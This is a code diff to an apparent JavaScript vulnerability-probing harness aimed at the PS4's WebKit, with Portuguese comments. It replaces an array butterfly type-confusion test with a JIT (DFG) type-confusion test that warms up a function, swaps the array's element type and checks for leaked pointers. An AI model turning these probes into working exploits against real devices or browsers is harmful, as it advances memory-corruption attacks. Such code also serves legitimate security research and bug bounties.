@@ -497,37 +497,39 @@ export const Factory = {
             }
         });
 
-        // ══════════════════════════════════════════════════════════════
-        // 10. JSC Array Butterfly Type Confusion
-        //     C++: JSArray.cpp / JSObject.h
-        //     Risco: CRÍTICO — O vetor mais valioso para exploits e Bounties
+       // ══════════════════════════════════════════════════════════════
+        // 10. JSC JIT (DFG/FTL) Type Confusion Optimization
+        //     Risco: CRÍTICO — Bypassa as checagens do interpretador
         // ══════════════════════════════════════════════════════════════
         register({
-            id: 'JSC_ARRAY_BUTTERFLY_CONFUSION',
+            id: 'JSC_JIT_TYPE_CONFUSION',
             category: 'CoreJS',
             risk: 'HIGH',
             description: [
-                'Tenta forçar uma transição no JSCell IndexingType (de Double para Contiguous)',
-                'durante uma operação síncrona. Se o motor não atualizar o ponteiro do',
-                'Butterfly a tempo, ele vai ler um número Float como se fosse um',
-                'ponteiro de Objeto (vazando endereço) ou retornar undefined/null fantasma.'
+                'Faz o aquecimento (warm-up) de uma função vulnerável para forçar o',
+                'compilador JIT (DFG) a remover as checagens de tipo de array.',
+                'Após a compilação, altera o tipo (Double -> Contiguous) e aciona a função.',
+                'Retornar undefined, null ou ponteiros vazados indica vulnerabilidade no JIT.'
             ].join(' '),
 
             setup: function() {
-                // Cria um array puro de Doubles (IndexingType = ALL_DOUBLE_INDEXING_TYPES)
+                // A função que vamos forçar o WebKit a otimizar.
+                // Ela lê valores do array e faz matemática. O JIT vai achar que 'arr' é SEMPRE um array de Doubles.
+                this.vulnFunction = function(arr, index) {
+                    return arr[0] + arr[index]; 
+                };
+
                 this.vulnArray = [1.1, 2.2, 3.3, 4.4, 5.5];
-                
-                // Um objeto malicioso que será injetado
+
+                // FASE 1: O AQUECIMENTO (Warm-up)
+                // Rodamos 10.000 vezes para o PS4 compilar this.vulnFunction em Assembly puro (sem checagem de limites/tipos).
+                for (let i = 0; i < 10000; i++) {
+                    this.vulnFunction(this.vulnArray, 1);
+                }
+
+                // O nosso objeto malicioso que será injetado após a otimização
                 this.evilObject = { 
                     valueOf: () => {
-                        // O GATILHO: Durante uma conversão implícita, mudamos o tipo do array
-                        // ao injetar um objeto nele. Isso força a realocação do Butterfly
-                        // de Double para Contiguous (Objetos).
-                        this.vulnArray[1] = {};
-                        
-                        // Forçamos o GC para tentar limpar o Butterfly antigo
-                        let trash = [];
-                        for(let i=0; i<10; i++) trash.push(new ArrayBuffer(1024*1024));
                         return 1337;
                     }
                 };
@@ -535,29 +537,35 @@ export const Factory = {
 
             trigger: function() {
                 try {
-                    // Operação que aciona leitura interna do C++ e chama o valueOf do evilObject
-                    // O C++ começa a ler assumindo que são Doubles, o evilObject muda o tipo a meio,
-                    // e o C++ termina a leitura com o tipo errado.
-                    Math.max(this.vulnArray[0], this.evilObject, this.vulnArray[2]);
+                    // FASE 2: A MUTAÇÃO
+                    // O JIT confia cegamente que vulnArray só tem Doubles.
+                    // Nós injetamos um objeto, forçando o C++ a realocar o Butterfly por baixo dos panos.
+                    this.vulnArray[2] = this.evilObject;
+                    
+                    // FASE 3: O ATAQUE
+                    // Chamamos a função compilada em Assembly que não tem checagens de tipo.
+                    // Ela vai tentar ler vulnArray[3] achando que é um número (8 bytes puros),
+                    // mas o layout da memória acabou de mudar!
+                    this.vulnFunction(this.vulnArray, 3);
                 } catch(e) {}
             },
 
             probe: [
-                // Se o Array sofreu Type Confusion, índices que eram números (ex: 3.3)
-                // podem subitamente ser interpretados como "undefined", "null" ou objetos corrompidos.
-                s => s.vulnArray[0],
-                s => s.vulnArray[2],
                 s => s.vulnArray[3],
                 s => s.vulnArray[4],
-                s => typeof s.vulnArray[3], // Era 'number'. Se for 'undefined' ou 'object', BINGO!
+                // A prova absoluta: Se um valor que colocámos como número (ex: 4.4 ou 5.5)
+                // for interpretado subitamente como undefined ou null após o trigger,
+                // significa que o JIT leu a área errada da memória (Type Confusion real).
+                s => typeof s.vulnArray[3], 
+                s => typeof s.vulnArray[4]
             ],
 
             cleanup: function() {
+                this.vulnFunction = null;
                 this.vulnArray = null;
                 this.evilObject = null;
             }
         });
-
         return list;
     }
 };
